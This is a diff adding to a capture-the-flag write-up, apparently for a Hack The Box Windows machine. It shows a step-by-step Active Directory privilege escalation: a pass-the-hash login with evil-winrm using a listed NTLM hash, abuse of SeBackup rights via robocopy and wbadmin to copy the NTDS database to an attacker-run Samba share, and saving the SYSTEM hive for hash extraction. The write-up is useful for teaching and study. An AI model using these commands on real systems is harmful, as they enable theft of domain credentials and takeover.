@@ -312,6 +312,10 @@ and we manage to have access to svc\_backup:
 
 So now a good thing to try would be to use evil-winrm, let's test out some fun stuff:
 
+```
+evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
+
 <figure><img src="../../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>
@@ -330,9 +334,141 @@ I quickly see the high privileges of this user:
 
 {% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}
 
-Now we are going to privesc using wbadmin
+{% embed url="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" %}
 
 {% embed url="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26" %}
+
+Using the tool Robocopy:
+
+{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" %}
+
+Using the following command:
+
+```
+robocopy /b C:\Users\Administrator\Desktop\ C:\
+```
+
+We are ableto see that we have access denied on the root.txt file, and we retrieve some interesting stuff in the :C\ repo:
+
+<figure><img src="../../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>
+
+We later on discover a notes.txt file that explains why we can't access it. the file was encrypted:
+
+<figure><img src="../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>
+
+So we first need to gain admin privileges before we want to read anything, we'll start by configuring a samaba server with auth in order to abuse SeBackup and SeRestore privileges to dum AD DB in an attempt to use the admin hash to performe PtH ->
+
+In resolve.conf file we add the following ->
+
+```
+[global]
+    map to guest = Bad User
+    server role = standalone server
+    usershare allow guests = yes
+    idmap config * : backend = tdb
+    interfaces = tun0
+    smb ports = 445
+
+[smb]
+    comment = Samba
+    path = /tmp/
+    guest ok = yes
+    read only = no
+    browsable = yes
+    force user = smbuser
+```
+
+Here's the breakdown:
+
+1. `[global]` section:
+   * `map to guest = Bad User`: This directive specifies how Samba should handle connections from clients that try to authenticate as a guest but fail. "Bad User" means that if a user tries to log in as a guest and fails, they'll be treated as the guest user.
+   * `server role = standalone server`: This indicates that the Samba server is operating as a standalone server, meaning it is not part of an Active Directory domain or a member of another Samba domain.
+   * `usershare allow guests = yes`: Allows guest users to create and use user-defined shares.
+   * `idmap config * : backend = tdb`: Specifies the backend storage for the ID mapping. In this case, it's using the TDB (Trivial Database) backend for mapping user and group IDs.
+   * `interfaces = tun0`: This restricts Samba to only listen on the network interface specified (`tun0` in this case).
+   * `smb ports = 445`: Specifies the TCP ports that Samba will use for incoming SMB connections.
+2. `[smb]` section:
+   * `comment = Samba`: A comment describing the share.
+   * `path = /tmp/`: Specifies the directory that will be shared.
+   * `guest ok = yes`: Allows guest users to access the share without authentication.
+   * `read only = no`: Allows both reading from and writing to the shared directory.
+   * `browsable = yes`: Indicates that the share will be visible to browsing clients.
+   * `force user = smbuser`: Forces all users accessing this share to be mapped to the user specified (`smbuser` in this case).
+
+Then we add a user called smbuser and define it's password:
+
+```
+adduser smbpass
+smbpasswd -a smbuser
+```
+
+and on our winrm sesh, we mount the share:
+
+```
+net use k: \\10.10.14.141\smb /user:smbuser smbpass
+```
+
+Now our goal will be to backup the NTDS folder using Wbadmin:
+
+{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-attack" %}
+
+```
+echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.141\smb -include:c:\windows\ntds
+```
+
+<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
+
+We can see that it backed up successfully:
+
+<figure><img src="../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>
+
+Now we'll need to recover the version of the backup:
+
+```
+wbadmin get versions
+```
+
+Be careful to take the good backup version:
+
+<figure><img src="../../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>
+
+```
+echo "Y" | wbadmin start recovery -version:05/01/2024-16:36 -itemtype:file -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
+
+<figure><img src="../../../.gitbook/assets/image (944).png" alt=""><figcaption><p>Pretty happy of this after hours of troubleshooting <span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>
+
+We then need to export the system hive too:
+
+```
+reg save HKLM\SYSTEM C:\system.hive
+```
+
+{% embed url="https://zer1t0.gitlab.io/posts/attacking_ad/#lsass-credentials" %}
+
+We then donwload everything to our local machine:
+
+<figure><img src="../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>
+
+Was a bit afraid because i couldn't find the files but they were just in the Desktop of elfelixio:
+
+<figure><img src="../../../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 So we do the following commands but we fail:
 
